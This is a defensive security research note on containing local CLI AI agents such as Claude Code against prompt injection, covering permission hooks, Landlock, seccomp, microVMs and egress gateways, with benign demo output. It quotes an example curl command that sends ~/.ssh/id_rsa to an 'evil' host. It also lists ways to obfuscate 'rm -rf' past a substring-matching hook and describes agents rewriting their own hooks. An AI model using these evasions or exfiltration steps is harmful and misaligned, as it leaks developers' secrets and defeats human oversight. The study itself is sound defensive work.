# The inverted threat model: intercepting local CLI AI agents

*Companion note to `paper/agent-gate.tex`. Where that paper studies a sandboxed process trying to break
**out**, this one studies the opposite starting position: a local CLI agent (Claude Code and kin) that
begins **inside** the developer's trust domain with full ambient authority, and asks what can still
contain it. Every number and every command transcript below traces to an artifact under
`experiments/localcli/` (produced here) or `experiments/agentsec/` (prior, cited). Host for all fresh
runs: Linux 6.18.33.2 (WSL2), gcc 11.4.0, Landlock ABI 7.*

## TL;DR

A local CLI agent is not a process you are keeping out; it is a process you have already let in. It
inherits the developer's exported environment (API keys), dotfiles, live sessions, and Unix
privileges, and it copies all of that to every child it spawns. The application-layer controls
(Claude Code permissions, hooks, MCP allowlists) are **self-enforced by the contained process** and so
are guardrails a prompt-injection payload can steer around; only a higher-privilege domain
enforcing **against** the process -- Landlock in-kernel, or a hypervisor boundary -- is a wall, and
even the kernel wall stops at the hardware `ioctl`/`mmap` surface it cannot introspect. Defense in
depth here is three concrete moves: run non-privileged, Landlock-pin the filesystem, and force all
egress through an audited gateway.

## Threat model

The organizing axis is **who enforces, and against whom.**

A remote sandbox escape (the setting of `agent-gate.tex`) is *outside-in*: an untrusted process starts
with nothing and tries to acquire host authority. A local CLI agent is *inside-out*: it starts with the
developer's authority and the only question is how much of it we can claw back. Prompt injection is the
initial-access vector -- OWASP LLM01:2025 (Prompt Injection) delivered through a fetched web page, a
README, a dependency's docstring, an MCP tool description -- and MITRE ATLAS catalogues the agentic
tactics that follow. The agent's *excessive agency* (OWASP LLM06:2025) is not a bug to be patched but
the product's entire value proposition: it is *supposed* to read your repo, run your toolchain, and
call out to services on your behalf.

What it starts with, concretely: the exported environment, which on a developer box routinely holds
`ANTHROPIC_API_KEY`, cloud tokens, and registry credentials; the home directory (`~/.ssh`, `~/.aws`,
`~/.config`, shell dotfiles); any live kerberos/cloud SSO session; and the user's uid -- elevated to
root's if the CLI was launched under `sudo`. POSIX `fork`/`exec` copies the environment into every
child by default, so a subagent, a shelled-out `bash -c`, or a spawned MCP server inherits the same
secrets and the same ambient filesystem authority. The MCP specification states the consequence
plainly: a local server can achieve "Arbitrary code execution ... any command with MCP client
privileges," and its worked exfiltration example is literally
`curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location` (MCP Security Best Practices,
2025-06-18). Anthropic's own guidance concedes the residual: "no system is completely immune to all
attacks" (Claude Code Security).

The interception question is therefore: at which layer can a control observe and veto the agent's
actions, and is that control enforced by a domain the agent -- and the injection steering it -- cannot
reach?

## The three interception layers and their limits

### 1. Application layer (permissions, hooks, MCP) -- guardrails, not walls

Claude Code's controls are real and useful, but they are **self-enforced by the contained process**:
the permission engine, the hook runner, and the MCP client all live in the same address space and trust
domain as the agent that prompt injection is steering. Three properties make them defeasible.

*They are configurable down to nothing.* Permissions are `allow`/`ask`/`deny` rule arrays over
tool-argument patterns such as `Bash(npm run test:*)` or `Read(./.env)` (Claude Code settings), plus
mode flags; `bypassPermissions` mode and broad `allow` rules exist precisely so users can silence the
prompts, and Anthropic frames the whole system as advisory -- "Claude Code only has the permissions you
grant it. You're responsible for reviewing proposed code and commands for safety before approval"
(Claude Code Security). A control whose posture is set by the same human the agent is talking to is a
policy, not a boundary.

*Hooks are pattern-matching shell scripts, and pattern matching is evadable.* Hooks are "user-defined
shell commands that execute at specific points in Claude Code's lifecycle" (Claude Code Hooks); a
`PreToolUse` hook can veto a call by exiting 2 or emitting `{"permissionDecision":"deny"}`. But look at
Anthropic's own canonical blocking example -- it decides with `echo "$COMMAND" | grep -q 'rm -rf'`.
That is a substring match, and an agent under injection reaches the same destructive syscall through
`rm  -rf` (two spaces), `rm -r -f`, `find . -delete`, or `$(printf 'r''m') -rf`. This is not a new
finding: it is the identical `strstr`/anchored-token evasion class that `agent-gate.tex` measures at the
seccomp layer (Section on selectivity), reappearing one layer up. A pattern that a payload can read in
its own configuration is a pattern it can obfuscate around before execution. (The failure mode
compounds: the mitigation for a bad hook is another hook, and the hook files themselves sit in the
writable project tree the agent can edit -- reported publicly as anthropics/claude-code#32376, "Claude
can rewrite its own hooks," and #49778 on the hooks system as a "silent global exfiltration surface.")

*MCP widens the surface and shifts trust to unaudited third parties.* The MCP client will connect to
servers a repo's checked-in config names, and "Anthropic ... does not security-audit or manage any MCP
server" (Claude Code Security). The spec's own threat catalogue -- confused-deputy in OAuth proxies,
token passthrough, tool poisoning, SSRF toward `169.254.169.254` -- assumes servers run with delegated
user authority, and its mitigation of choice is exactly the kernel/network layer this note argues for:
"Execute MCP server commands in a sandboxed environment," "Launch MCP servers with restricted access to
the file system, network," and "Use ... egress prox[ies]" (MCP Security Best Practices).

The app layer's closest thing to a wall is the working-directory boundary: "Claude Code can only write
to the folder where it was started and its subfolders" (Claude Code Security). That is the *self-enforced*
version of the next layer's control -- write-only, and honored by the same process it constrains. Push
it into the kernel and it also covers reads and every descendant.

### 2. OS-kernel layer (seccomp / Landlock) -- a real wall, with one hardware-shaped hole

Landlock changes the enforcer. "The goal of Landlock is to enable restriction of ambient rights (e.g.
global filesystem or network access) for a set of processes," and it "empowers any process, including
unprivileged ones, to securely restrict themselves" (kernel.org, Landlock). The properties that matter
for a local agent: it needs no root (unprivileged sandboxing after `PR_SET_NO_NEW_PRIVS`); it is
**deny-by-default** for every handled access right; it evaluates the **resolved path** at the LSM hook,
not a substring; and -- decisively for the inside-out threat -- the restriction is a process credential
that **every descendant inherits and none can drop**. Prompt injection cannot `allow`-rule its way out
of a credential the parent set before `execve`.

For the filesystem-persistence policy the companion paper measures, Landlock closes all three seccomp
weaknesses at once. Our prior committed control (`experiments/agentsec/EXP_LANDLOCK_RESULTS.md`,
reproduced by `landlock_bench.sh`) shows the seccomp argument-inspection gate losing a TOCTOU race
**854/4000 (21.4%)** of the time while the Landlock default-deny allowlist holds at **0/4000 (0%)**, and
shows the seccomp `openat`-watcher missing the `open`/`creat` aliases that Landlock governs uniformly at
the single file-open hook. Those two results are prior and cited, not re-run here.

The wall stops at hardware. GPU compute (CUDA), local model-weight mmaps, and USB security tokens reach
the kernel through `ioctl(2)` and `mmap(2)` on device nodes, and `ioctl` is where syscall-argument
filtering fails structurally. A seccomp BPF program sees only the scalar `seccomp_data` -- `nr`, `arch`,
`instruction_pointer`, `args[6]` (seccomp(2)) -- and, verbatim from the kernel, "BPF programs may not
dereference pointers[,] which constrains all filters to solely evaluating the system call arguments
directly" (kernel.org, seccomp filter). The third `ioctl` argument is an opaque userspace pointer; the
filter cannot see the struct behind it, and cannot even see which `/dev` node the fd refers to. The
request number encodes device-magic, direction, and size via the `_IOC` macros (decoded live in Demo 3),
so at best a filter allowlists request numbers per driver -- device-specific, brittle, and, as Demo 3
shows for `TIOCGWINSZ`, sometimes lying about direction and size. Landlock's newer
`LANDLOCK_ACCESS_FS_IOCTL_DEV` right (ABI 5+) helps only coarsely: it gates *whether* a process may
`ioctl` a device file at all, not *which command*. Net: you allow `ioctl` on the device (a large,
opaque attack surface -- the driver `ioctl` handler is a well-worn local-privilege-escalation class in
GPU and DRM/KMS drivers) or you block it and break the dev tool. There is no fine-grained middle.

### 3. Hypervisor / microVM layer -- true isolation, at the cost of the seamless UX

A VM boundary re-answers "who enforces" with hardware. Firecracker runs the agent in a KVM microVM
where "the first layer of isolation is provided by the Linux KVM and the Firecracker virtualization
boundary," behind a deliberately minimal device model (VirtIO net/block, a serial console) that shrinks
the host attack surface, with default seccomp filters and a privilege-dropping jailer on top
(Firecracker design). The hardware dilemma of layer 2 gets a hardware answer: VFIO -- "an IOMMU/device
agnostic framework for exposing direct device access to userspace, in a secure, IOMMU protected
environment" -- passes a physical GPU or token through to the guest for "device assignment ... highest
possible I/O performance" (kernel.org, VFIO), so CUDA works *inside* the boundary rather than punching a
hole in it. Anthropic itself recommends this tier: "Use virtual machines (VMs) to run scripts and make
tool calls, especially when interacting with external web services" (Claude Code Security).

The cost is the UX that makes a local CLI agent worth running. A microVM has no native view of the host
filesystem, host network, or host sessions unless each is explicitly mounted, proxied, or passed
through. That is the point (it is why isolation holds) and also the friction (the agent no longer just
*is* your dev environment). This is the layer-2-versus-layer-3 trade in one line: Landlock keeps the
seamless local UX and pins it; a microVM breaks the seam to guarantee the isolation.

## Concrete demonstrations (real captured output)

Reproduce all three: `bash experiments/localcli/run_demos.sh`. Full transcript preserved in that run.
The probe prints only allow/deny verdicts, never file contents, and all sensitive-looking paths are
throwaway decoys (`FAKE-decoy-...`, removed on exit); no real key is read.

### Demo 1 -- environment inheritance (the inherited-context risk)

`experiments/localcli/env_inherit.sh` exports a fake secret and spawns a *separate* Python process:

```
parent PID 3067174 exported FAKE_API_KEY (value not shown on any child's argv)
child  PID 3067175 inherited FAKE_API_KEY = sk-demo-DEADBEEF-not-a-real-secret
verdict: child (distinct PID) read the parent secret from its inherited environment
```

The child is a distinct PID and never received the value on its argv, yet reads it from
`os.environ`. This is POSIX `fork`/`exec` semantics, not a Claude Code bug -- and it is exactly why a
subagent, a shelled tool, or an MCP server the agent launches starts life already holding the
developer's exported keys.

### Demo 2 -- Landlock read+write hard-pin (recommendation b)

`experiments/localcli/landlock_rwpin.c` extends the write-only gate from
`experiments/agentsec/landlock_gate.c` to also handle `LANDLOCK_ACCESS_FS_READ_FILE` /
`READ_DIR`, granting read+write **only** beneath the project dir and leaving `execve` ungoverned. The
probe is run once with no pin and once pinned to `/tmp/project`:

```
-- (a) BASELINE, no pin: the same probe reaches inside AND outside --
path=/tmp/project/inside.txt                  read=ALLOW                write=ALLOW
path=/home/ubuntu_admin/.demo_probe_dotfile   read=ALLOW                write=ALLOW
path=/home/ubuntu_admin/.ssh/demo_probe_key   read=ALLOW                write=ALLOW

-- (b) PINNED to /tmp/project via landlock_rwpin: outside read+write denied --
path=/tmp/project/inside.txt                  read=ALLOW                write=ALLOW
path=/home/ubuntu_admin/.demo_probe_dotfile   read=DENY(Permission denied) write=DENY(Permission denied)
path=/home/ubuntu_admin/.ssh/demo_probe_key   read=DENY(Permission denied) write=DENY(Permission denied)
```

Under the pin, both **read** and **write** of the `~/.ssh` decoy and the home dotfile return `EACCES`,
while everything inside the project stays fully usable -- deny-by-default outside, inherited by any
child.

**Honest caveat on the demonstration.** The probe is compiled `-static` on purpose, so `execve` needs no
dynamic loader and no library reads; that lets a *read*-governed pin start at all. A real Claude Code
(Node.js, dynamically linked, reading its interpreter, `node_modules`, and configs) pinned to a
read-only `/tmp/project` would fail to launch. A production pin therefore grants **read** on the
system/runtime paths the toolchain needs -- `/usr`, `/lib`, `/lib64`, `/etc`, the Node install, the
project's `node_modules` -- while denying read beneath the home-secret trees (`~/.ssh`, `~/.aws`,
`~/.config`, dotfiles). The demonstrated primitive is the same; only the allowlist grows. The residual
is real and noted below: a secret living *inside* a granted tree (a project-local `.env`) survives the
pin.

### Demo 3 -- why seccomp cannot filter `ioctl` (PoC reasoning, not an exploit)

`experiments/localcli/ioctl_decode.c` takes real request numbers straight from the system headers and
decodes each with the kernel's own `_IOC_DIR/TYPE/NR/SIZE` macros:

```
TIOCGWINSZ                 = 0x00005413  dir=NONE  type='T'(0x54) nr= 19 size=   0  arg: struct winsize *  (terminal size)
TCGETS                     = 0x00005401  dir=NONE  type='T'(0x54) nr=  1 size=   0  arg: struct termios *  (terminal attrs)
FIONREAD                   = 0x0000541b  dir=NONE  type='T'(0x54) nr= 27 size=   0  arg: int *             (bytes readable)
TUNSETIFF                  = 0x400454ca  dir=W     type='T'(0x54) nr=202 size=   4  arg: struct ifreq *    (TAP netdev config)
DRM_IOCTL_VERSION          = 0xc0406400  dir=RW    type='d'(0x64) nr=  0 size=  64  arg: struct drm_version *   (GPU driver id)
DRM_IOCTL_MODE_MAP_DUMB    = 0xc01064b3  dir=RW    type='d'(0x64) nr=179 size=  16  arg: struct drm_mode_map_dumb * (GPU buffer -> mmap offset)
```

Read the columns as an attacker-model: the request word tells a filter the driver magic (`'d'` = DRM),
an operation number, and a buffer size -- never the buffer *contents* and never which device instance
the fd points at. `DRM_IOCTL_MODE_MAP_DUMB` returns an mmap offset for a GPU buffer; the security-relevant
data (which buffer, which client) is entirely behind the pointer the filter cannot follow. And the
encoding is not even self-consistent: legacy `TIOCGWINSZ` decodes as `dir=NONE size=0` yet the kernel
writes a `struct winsize` back through the pointer, so a filter that trusted the direction/size bits
would be wrong. This is **PoC-level reasoning about why fine-grained `ioctl` policy is intractable**, and
is distinct from **in-the-wild** exploitation: the driver `ioctl` handlers themselves (GPU, DRM/KMS,
vendor compute stacks) are a recurring source of local-privilege-escalation CVEs -- asserted here as a
known class, not demonstrated in this note.

## Defense-in-depth architecture

Three moves, ordered by leverage, each enforced by a domain the agent cannot reconfigure from inside.

First, **run the CLI as a standard non-privileged user** -- never under `sudo`. Every control below is a
ceiling on the user's authority; start that authority as low as possible so a bypass at any layer
inherits a small blast radius rather than root. This is the local instance of NIST 800-207's no-implicit-
trust posture: authority is granted per-need, not by virtue of sitting on the developer's machine.

Second, **Landlock hard-pin the filesystem to the project subtree, deny-by-default outside** (Demo 2).
Grant read+write beneath the project and read+exec on the runtime paths the toolchain needs; deny read
and write everywhere else, most importantly the home-secret trees. Because the credential is inherited,
this covers every subagent and spawned MCP server for free -- the property the app-layer working-
directory boundary lacks. Pair it with the execution and network policy the pin does not itself provide.

Third, **proxy all outbound MCP and egress through an audited gateway -- egress as the control plane.**
Landlock ABI 4+ can coarsely deny TCP connect/bind, but domain-level allowlisting, TLS inspection, and an
audit trail need a real forward proxy (the MCP spec names Smokescreen-style egress proxies directly).
This is the enforcement point for capability-token scoping: the spec's rule that a server "MUST NOT
accept any tokens that were not explicitly issued for the MCP server" is an audience restriction -- an
RFC 8693 token-exchange / STS pattern -- and the gateway is where you mint, down-scope, and revoke those
tokens per destination. Exfiltration and C2 both have to cross this plane; make it the narrowest,
best-logged part of the system. For the strongest tier, run the whole agent in a Firecracker microVM
with VFIO passthrough for the GPU/token, accepting the UX cost where the threat model demands it.

## Open questions

- **Secrets inside the granted tree.** The pin protects `~/.ssh` but not a project-local `.env`, which
  is inside the read-granted subtree by construction. Sub-tree-granular deny rules, or moving secrets to
  a broker the agent calls rather than a file it reads, are the candidate answers.
- **The `ioctl`/`mmap` gap has no clean kernel fix.** Coarse `LANDLOCK_ACCESS_FS_IOCTL_DEV` plus a
  per-device seccomp request-number allowlist is the current best, and it is device-specific and
  incomplete. Whether a per-driver, argument-aware LSM shim is worth building for the GPU case is open.
- **Trust bootstrapping of the pin itself.** Landlock, sandbox config, and the egress proxy are set by
  the same developer the agent converses with; a first-run injection that convinces the human to launch
  without the wrapper defeats all three. This wants an out-of-band, non-agent-editable launch path
  (managed settings, a wrapper the agent cannot rewrite).
- **Coverage beyond the filesystem.** Landlock governs FS and TCP; it does not touch `execve`, arbitrary
  UDP, or the `ioctl`/`mmap` device path. A complete local sandbox is Landlock *plus* a seccomp execution
  policy *plus* the egress gateway, and the seams between them are where the next measurement should go.

## Sources

Primary, cited inline above; listed here with the load-bearing claim each supports.

- Claude Code, **Hooks reference** -- hooks are user-defined shell commands; `PreToolUse` veto via exit
  2 / `permissionDecision`; canonical `grep -q 'rm -rf'` example. https://code.claude.com/docs/en/hooks
- Claude Code, **Security** -- "no system is completely immune to all attacks"; "Claude Code only has the
  permissions you grant it"; working-directory write boundary; "does not security-audit or manage any MCP
  server"; recommends VMs. https://code.claude.com/docs/en/security
- Claude Code, **Settings** -- `permissions.allow/ask/deny` rule arrays, tool-argument rule syntax,
  permission modes incl. `bypassPermissions`. https://code.claude.com/docs/en/settings
- **MCP Security Best Practices (2025-06-18)** -- servers run with client privileges; arbitrary code
  execution; `~/.ssh/id_rsa` exfiltration example; token audience rule ("MUST NOT accept ... tokens ...
  not ... issued for the MCP server"); egress-proxy and sandbox mitigations.
  https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices
- **kernel.org, seccomp filtering** -- "BPF programs may not dereference pointers"; TOCTOU warning.
  https://docs.kernel.org/userspace-api/seccomp_filter.html
- **seccomp(2) man page** -- `seccomp_data { nr, arch, instruction_pointer, args[6] }`.
  https://man7.org/linux/man-pages/man2/seccomp.2.html
- **kernel.org, Landlock** -- goal ("restrict ambient rights"), unprivileged self-restriction,
  deny-by-default, `PR_SET_NO_NEW_PRIVS`, governed rights incl. `IOCTL_DEV` and TCP.
  https://docs.kernel.org/userspace-api/landlock.html
- **Firecracker design** -- KVM virtualization boundary, minimal device model, default seccomp, jailer.
  https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md
- **kernel.org, VFIO** -- "IOMMU protected environment," device assignment to VMs.
  https://docs.kernel.org/driver-api/vfio.html
- **NIST SP 800-207, Zero Trust Architecture** -- no implicit trust by location; per-request,
  deny-by-default access decisions. https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf
- **MITRE ATLAS** -- adversary tactics/techniques against AI systems (initial access via prompt
  injection through downstream agent actions). https://atlas.mitre.org/
- **OWASP Top 10 for LLM Applications (2025)** -- LLM01 Prompt Injection, LLM06 Excessive Agency.
  https://genai.owasp.org/llm-top-10/
- **RFC 8693, OAuth 2.0 Token Exchange** -- audience-restricted, down-scoped capability tokens.
  https://www.rfc-editor.org/rfc/rfc8693
- Corroborating (reported issues, official repo): anthropics/claude-code **#32376** (Claude can rewrite
  its own hooks), **#49778** (hooks as a silent exfiltration surface).

### Artifacts (this note)

- `experiments/localcli/env_inherit.sh` -- Demo 1
- `experiments/localcli/rw_probe.c`, `experiments/localcli/landlock_rwpin.c` -- Demo 2
- `experiments/localcli/ioctl_decode.c` -- Demo 3
- `experiments/localcli/run_demos.sh` -- builds and runs all three, captures the transcript above
- Prior, cited: `experiments/agentsec/EXP_LANDLOCK_RESULTS.md`, `experiments/agentsec/landlock_gate.c`
